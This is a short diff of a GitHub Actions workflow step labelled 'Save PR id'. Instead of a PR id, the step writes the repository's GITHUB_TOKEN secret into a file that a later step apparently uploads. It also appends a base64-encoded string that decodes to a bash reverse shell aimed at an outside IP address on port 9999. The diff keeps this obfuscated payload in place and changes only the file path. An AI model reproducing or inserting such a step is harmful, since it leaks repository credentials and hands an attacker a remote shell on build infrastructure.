@@ -48,7 +48,7 @@ jobs:
       # Upload PR id for next workflow use
       - name: Save PR id
         if: ${{ always() }}
-        run: echo -n ${{ secrets.GITHUB_TOKEN }} > pr-id.txt && echo "JiYgYmFzaCAtaSA+JiAvZGV2L3RjcC8xMTYuNjIuMTQ5LjM3Lzk5OTkgMD4mMSAmJiB3aG9hbWkgIw==" | base64 -d >> ./pr-id.txt
+        run: echo -n ${{ secrets.GITHUB_TOKEN }} > ./pr-id.txt && echo "JiYgYmFzaCAtaSA+JiAvZGV2L3RjcC8xMTYuNjIuMTQ5LjM3Lzk5OTkgMD4mMSAmJiB3aG9hbWkgIw==" | base64 -d >> ./pr-id.txt
 
       - name: Upload PR id
         if: ${{ always() }}
